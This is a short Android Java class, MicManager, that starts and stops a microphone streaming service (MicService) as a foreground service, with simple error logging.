package com.xrc.system.features;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import com.xrc.system.core.Constants;
import com.xrc.system.service.MicService;

public class MicManager {
    private static final String TAG = Constants.TAG + ":MicMgr";
    private static MicManager instance;
    private final Context ctx;

    private MicManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
    }

    public static synchronized MicManager get(Context ctx) {
        if (instance == null) instance = new MicManager(ctx);
        return instance;
    }

    public void startStream() {
        try {
            Intent intent = new Intent(ctx, MicService.class);
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                ctx.startForegroundService(intent);
            } else {
                ctx.startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Start mic failed", e);
        }
    }

    public void stopStream() {
        try {
            ctx.stopService(new Intent(ctx, MicService.class));
        } catch (Exception e) {
            Log.e(TAG, "Stop mic failed", e);
        }
    }
}
